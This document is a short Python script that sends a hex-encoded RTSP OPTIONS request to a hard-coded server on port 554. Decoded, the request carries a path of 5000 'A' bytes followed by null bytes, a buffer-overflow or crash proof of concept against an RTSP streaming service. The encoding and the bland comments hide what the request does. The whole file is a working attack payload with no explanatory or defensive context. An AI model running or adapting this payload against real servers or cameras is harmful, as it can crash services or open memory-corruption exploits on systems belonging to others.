import socket

def send_rtsp_options_request(server_ip, server_port, rtsp_path):
    # make RTSP OPTIONS request
    d = "4f5054494f4e53202f2e3a2f"+"41"*5000+"00003a2f2f3132372e302e302e313a3535342f6c69766520525453502f312e300d0a435365713a20310d0a557365722d4167656e743a2066757a7a0d0a0d0a"

    rtsp_options_request = bytes.fromhex(d)

    # create TCP socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))

        # send RTSP OPTIONS reqeust
        s.sendall(rtsp_options_request)

        # get response
        response = s.recv(1024)
        print(response.decode())

if __name__ == "__main__":
    server_ip = "192.168.175.136"
    server_port = 554
    rtsp_path = "/example.sdp"

    send_rtsp_options_request(server_ip, server_port, rtsp_path)
